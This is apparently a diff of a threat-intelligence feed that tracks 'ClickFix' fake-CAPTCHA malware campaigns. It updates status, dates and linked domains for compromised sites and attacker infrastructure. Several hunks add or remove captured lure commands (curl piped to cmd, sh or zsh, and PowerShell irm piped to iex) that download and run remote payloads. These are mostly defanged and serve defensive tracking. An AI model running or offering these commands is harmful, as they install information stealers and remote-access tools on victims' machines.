@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 4972,
+ "count": 4970,
  "indicators": [
   {
    "indicator": "1.234.27.94",
@@ -1158,7 +1158,7 @@
    "hosts": [
     {
      "host": "146.59.155.133",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-24",
      "last_seen": "2026-10-25"
     }
@@ -1352,7 +1352,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "156.244.25.70",
@@ -1452,7 +1454,7 @@
    "role": "Phishing page",
    "status": "offline",
    "first_seen": "2026-10-23",
-   "last_seen": "2026-11-06",
+   "last_seen": "2026-11-07",
    "last_online": "2026-11-06",
    "offline_since": "2026-11-06",
    "url": "http://161.118.211.157:8081/",
@@ -1470,7 +1472,7 @@
      "host": "161.118.211.157",
      "status": "offline",
      "first_seen": "2026-10-23",
-     "last_seen": "2026-11-06"
+     "last_seen": "2026-11-07"
     }
    ],
    "actor": null,
@@ -2024,7 +2026,7 @@
    "role": "Phishing page",
    "status": "online",
    "first_seen": "2026-10-19",
-   "last_seen": "2026-11-06",
+   "last_seen": "2026-11-07",
    "last_online": "2026-11-07",
    "offline_since": null,
    "url": "http://172.86.72.143/",
@@ -2042,7 +2044,7 @@
      "host": "172.86.72.143",
      "status": "online",
      "first_seen": "2026-10-19",
-     "last_seen": "2026-11-06"
+     "last_seen": "2026-11-07"
     }
    ],
    "actor": null,
@@ -2816,7 +2818,7 @@
    "hosts": [
     {
      "host": "23.92.26.197",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-11-05"
     }
@@ -4389,7 +4391,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "38.60.233.200",
@@ -8126,15 +8130,16 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=2e6bec49-84e2-41fa-87d9-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.a-stergiou.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-04T06%3A21%3A55.514Z\"\" -d \"\"lastShellAt=2026-11-04T06%3A21%3A55.514Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=e76fe24c-c935-41ab-bb27-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.a-stergiou.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-02T00%3A06%3A50.407Z\"\" -d \"\"lastShellAt=2026-11-02T00%3A06%3A50.407Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=c8f55566-ed02-406c-a3bf-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.a-stergiou.com%2F&os=Mac%2015&lastVisitAt=2026-11-07T02%3A48%3A19.043Z&lastShellAt=2026-11-07T02%3A48%3A19.043Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=f3fe0fe1-e2c9-4861-9265-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.a-stergiou.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T02%3A44%3A53.245Z\"\" -d \"\"lastShellAt=2026-11-07T02%3A44%3A53.245Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "ncheck-brows.beer"
+    "ncheck-brows.beer",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -8953,7 +8958,7 @@
    "hosts": [
     {
      "host": "abilitymba.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -11163,7 +11168,7 @@
    "hosts": [
     {
      "host": "www.adamconsultings.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-07"
     }
@@ -11796,7 +11801,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "adrianalopezfotografia.com",
@@ -14459,7 +14466,7 @@
    "hosts": [
     {
      "host": "akovka.kz",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -21337,7 +21344,7 @@
    "hosts": [
     {
      "host": "anthoniaeg.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-31"
     }
@@ -22794,7 +22801,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "aptunits.com",
@@ -26888,7 +26897,7 @@
    "hosts": [
     {
      "host": "association-mirabelle.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-28"
     }
@@ -29882,7 +29891,7 @@
    "hosts": [
     {
      "host": "aylentufuturobienesraices.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-31"
     }
@@ -40292,7 +40301,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -46407,7 +46417,7 @@
    "hosts": [
     {
      "host": "buletinnews.id",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-11-06"
     }
@@ -54365,7 +54375,7 @@
    "hosts": [
     {
      "host": "certificado-energetico-madrid.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-05"
     }
@@ -55058,7 +55068,8 @@
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -55275,7 +55286,8 @@
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -56666,7 +56678,8 @@
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -57939,7 +57952,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "claudiasotointerprete.com",
@@ -58438,7 +58453,7 @@
    "hosts": [
     {
      "host": "clickcamps.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-27"
     }
@@ -58545,7 +58560,7 @@
    "hosts": [
     {
      "host": "www.climariaonline.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -58693,14 +58708,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "trek-72.com",
-    "trustchecknes.com"
+    "t-trustrest.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -59176,7 +59192,7 @@
    "hosts": [
     {
      "host": "clubisho.ir",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
     }
@@ -59330,14 +59346,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "trek-72.com",
-    "trustchecknes.com"
+    "t-trustrest.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -60001,10 +60018,14 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
+    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh"
    ],
    "connects_to": [
-    "t-trustrest.com"
+    "t-trustrest.com",
+    "t-trustresnew.com",
+    "trek-72.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -61216,7 +61237,8 @@
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -62688,7 +62710,7 @@
    "hosts": [
     {
      "host": "www.contpercontabil.com.br",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-02",
      "last_seen": "2026-11-06"
     }
@@ -65840,7 +65862,7 @@
    "hosts": [
     {
      "host": "cslink.com.br",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
     }
@@ -66782,7 +66804,7 @@
    "hosts": [
     {
      "host": "customslipcoversnyc.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -76118,7 +76140,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "draufsehen.de",
@@ -79772,7 +79796,9 @@
     "trustchecknes.com"
    ],
    "lure_from": [
-    "interseq.at"
+    "interseq.at",
+    "govrobczxc.cc",
+    "fudcomcheck.art"
    ]
   },
   {
@@ -82244,7 +82270,7 @@
    "hosts": [
     {
      "host": "elbierestaurant.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-29"
     }
@@ -85332,9 +85358,9 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=604c37b3-ecf5-4097-b4a1-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fentreprise-ploton.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-04T06%3A22%3A04.241Z\"\" -d \"\"lastShellAt=2026-11-04T06%3A22%3A04.241Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\"",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=b416d36b-fc92-4f15-9af2-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fentreprise-ploton.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-02T00%3A06%3A52.353Z\"\" -d \"\"lastShellAt=2026-11-02T00%3A06%3A52.353Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=fc3286f2-29f7-493d-aab3-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fentreprise-ploton.com%2F&os=Mac%2015&lastVisitAt=2026-11-07T02%3A48%3A23.631Z&lastShellAt=2026-11-07T02%3A48%3A23.631Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=5635e132-4ed7-4099-84ca-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fentreprise-ploton.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-07T02%3A44%3A54.926Z\"\" -d \"\"lastShellAt=2026-11-07T02%3A44%3A54.926Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -85342,6 +85368,9 @@
    "lure_from": [
     "ubbrobccheck20.cc",
     "ncheck-brows.beer",
+    "govrobczxc.cc",
+    "fudcomcheck.art",
+    "codes.browse-cdn.beer",
     "verifyidentrob01.cc",
     "checkogosdfg33.cc"
    ]
@@ -87164,7 +87193,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "eurototop1win.space",
@@ -87673,7 +87704,7 @@
    "hosts": [
     {
      "host": "evostogel38max.online",
-     "status": "unknown",
+     "status": "online",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -88071,12 +88102,13 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//trustchecknes[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
+    "t-trustresnew.com",
     "trustchecknes.com",
     "t-trustrest.com"
    ],
@@ -93087,7 +93119,7 @@
    "hosts": [
     {
      "host": "first-unity.com.hk",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-31"
     }
@@ -93641,7 +93673,7 @@
    "hosts": [
     {
      "host": "www.florence-wischer-avocat.com",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-06"
     }
@@ -98556,7 +98588,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "gabreho.com",
@@ -99553,7 +99587,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
-   "lure_from": []
+   "lure_from": [
+    "codes.browse-cdn.beer"
+   ]
   },
   {
    "indicator": "gangarealtytathastu.com",
@@ -101793,7 +101829,7 @@
    "hosts": [
     {
      "host": "geometre-ledoare.fr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -104963,7 +104999,8 @@
     "id-verfied.boats"
    ],
    "lure_from": [
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer"
    ]
   },
   {
@@ -110634,7 +110671,7 @@
    "hosts": [
     {
      "host": "hallux-valgus-ingolstadt.de",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -110981,7 +111018,7 @@
    "hosts": [
     {
      "host": "handyklinikum-bremen.de",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-06"
     }
@@ -112951,7 +112988,7 @@
    "hosts": [
     {
      "host": "helloshopper.co.za",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-05"
     }
@@ -114760,7 +114797,7 @@
    "hosts": [
     {
      "host": "hiwayhydraulics.com.au",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -114805,7 +114842,7 @@
    "hosts": [
     {
      "host": "hiwayhydraulicservices.com.au",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -117653,9 +117690,10 @@
    "connects_to": [
     "xorados.com",
     "trek-72.com",
-    "t-trustrest.com",
     "hagosuro.lc",
-    "trustchecknes.com"
+    "t-trustrest.com",
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -119456,7 +119494,7 @@
    "hosts": [
     {
      "host": "ideea-design.ro",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -121699,7 +121737,7 @@
    "hosts": [
     {
      "host": "imperiamovies.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -135044,7 +135082,7 @@
    "hosts": [
     {
      "host": "kartalsoforlerodasi.org.tr",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-29",
      "last_seen": "2026-10-29"
     }
@@ -141858,10 +141896,11 @@
    "connects_to": [
     "xorados.com",
     "trek-72.com",
-    "t-trustrest.com",
     "hagosuro.lc",
+    "t-trustrest.com",
     "lepafonso.bz",
-    "trustchecknes.com"
+    "trustchecknes.com",
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -142035,7 +142074,7 @@
    "hosts": [
     {
      "host": "mardelupe.lachimenea.cl",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-22",
      "last_seen": "2026-10-22"
     }
@@ -146840,59 +146879,6 @@
    ]
   },
   {
-   "indicator": "loradidemolire.it",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-25",
-   "last_seen": "2026-10-26",
-   "last_online": "2026-11-07",
-   "offline_since": null,
-   "url": "https://www.loradidemolire.it/",
-   "brand": null,
-   "product": null,
-   "hosting": "ASN Aruba S.p.A.",
-   "dns": "arubadns.cz",
-   "ip": "2a00:6d40:4:1::c327:31",
-   "asn": "AS31034",
-   "org": "ARUBA-ASN Aruba S.p.A., IT",
-   "country": "IT",
-   "ips": [
-    {
-     "ip": "2a00:6d40:4:1::c327:31",
-     "asn": "AS31034",
-     "org": "ARUBA-ASN Aruba S.p.A., IT",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.loradidemolire.it",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
-   ],
-   "connects_to": [
-    "trek-72.com",
-    "t-trustrest.com",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "lorartek.com",
    "type": "domain",
    "category": "clickfix",
@@ -146995,6 +146981,7 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yaebalciganovvjopu.org",
+    "pizdalisibivet.org",
     "yaebaltakuyusety.com"
    ]
   },
@@ -149699,7 +149686,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "wwshyhig.wostu.store"
    ],
    "lure_from": []
   },
@@ -149867,7 +149855,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "9rh632up.wostu.store"
    ],
    "lure_from": []
   },
@@ -149986,7 +149975,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "rkf2ufvr.wostu.store"
    ],
    "lure_from": []
   },
@@ -155213,7 +155203,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "jwo7igk6.wostu.store"
    ],
    "lure_from": []
   },
@@ -155398,7 +155389,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "7yj4dre1.wostu.store"
    ],
    "lure_from": []
   },
@@ -155503,7 +155495,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "hs6z4a1f.wostu.store"
    ],
    "lure_from": []
   },
@@ -157805,7 +157798,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "85y0fg3o.wostu.store"
    ],
    "lure_from": []
   },
@@ -158914,11 +158908,13 @@
     "IRM fastly[.]jsdelivr[.]net/g\"h\"/sdedyk172/ad8f6908-5019-42ff-a88e-[id]/9cc8ac42-ee34-4250-bfee-[id] | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "0q2ps27h.wostu.store"
    ],
    "lure_from": [
     "interseq.at",
     "mon-blanc-02.cfd",
+    "pizdalisibivet.org",
     "efreitorher.org",
     "nikogdatakonebilo.cc",
     "yaebalciganovvjopu.org",
@@ -159113,14 +159109,15 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
+    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "(irm 'hxxps[:]//trustchecknes[.]com/ae8ouxb9gx/[id]')|iex"
    ],
    "connects_to": [
-    "t-trustrest.com",
     "trek-72.com",
+    "t-trustrest.com",
     "trustchecknes.com",
+    "t-trustresnew.com",
     "xorados.com"
    ],
    "lure_from": [
@@ -160698,61 +160695,6 @@
    ],
    "connects_to": [],
    "lure_from": []
-  },
-  {
-   "indicator": "mirencamarena.com",
-   "type": "domain",
-   "category": "clickfix",
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-25",
-   "last_seen": "2026-10-30",
-   "last_online": "2026-11-07",
-   "offline_since": null,
-   "url": "https://mirencamarena.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "IONOS",
-   "dns": "IONOS",
-   "ip": "217.160.0.2",
-   "asn": "AS8560",
-   "org": "IONOS-AS IONOS SE, DE",
-   "country": "DE",
-   "ips": [
-    {
-     "ip": "217.160.0.2",
-     "asn": "AS8560",
-     "org": "IONOS-AS IONOS SE, DE",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-30"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "mirencamarena.com",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-30"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "iex(irm 'hxxps[:]//cosmical2049[.]com/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
-   ],
-   "connects_to": [
-    "cosmical2049.com",
-    "xorados.com",
-    "groverudder12.com",
-    "t-trustrest.com",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
   },
   {
    "indicator": "misbahulquran.org",
@@ -163315,7 +163257,7 @@
    "hosts": [
     {
      "host": "mouheimen.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -163926,7 +163868,7 @@
    "hosts": [
     {
      "host": "msevietnam.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-10-30",
      "last_seen": "2026-10-31"
     }
@@ -164112,7 +164054,7 @@
    "hosts": [
     {
      "host": "mssvisoko.edu.ba",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-23",
      "last_seen": "2026-10-28"
     }
@@ -165012,7 +164954,7 @@
    "hosts": [
     {
      "host": "multitorq.pe",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-25",
      "last_seen": "2026-10-25"
     }
@@ -168569,7 +168511,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "rrpy8odb.wostu.store"
    ],
    "lure_from": []
   },
@@ -169031,7 +168974,7 @@
    "hosts": [
     {
      "host": "nguoidoncui.xyz",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-05"
     }
@@ -169082,7 +169025,7 @@
    "hosts": [
     {
      "host": "nguyenvanhoafood.com",
-     "status": "offline",
+     "status": "online",
      "first_seen": "2026-11-01",
      "last_seen": "2026-11-01"
     }
@@ -170861,7 +170804,7 @@
    "hosts": [
     {
      "host": "www.nowroma.it",
-     "status": "online",
+     "status": "offline",
      "first_seen": "2026-10-28",
      "last_seen": "2026-10-29"
     }
@@ -172618,7 +172561,8 @@
     "IRM glcdn[.]githack[.]com/675-ab67-6850a3f78/1eaec59f-d21e-4a31-993f-[id]/-/raw/main/a4F8-aCB97dD65d3D | IEX"
    ],
    "connects_to": [
-    "glcdn.githack.com"
+    "glcdn.githack.com",
+    "g0fj14jo.wostu.store"
    ],
    "lure_from": []
   },
@@ -173315,7 +173259,9 @@
    "connects_to": [
     "ncheck-brows.beer"
    ],
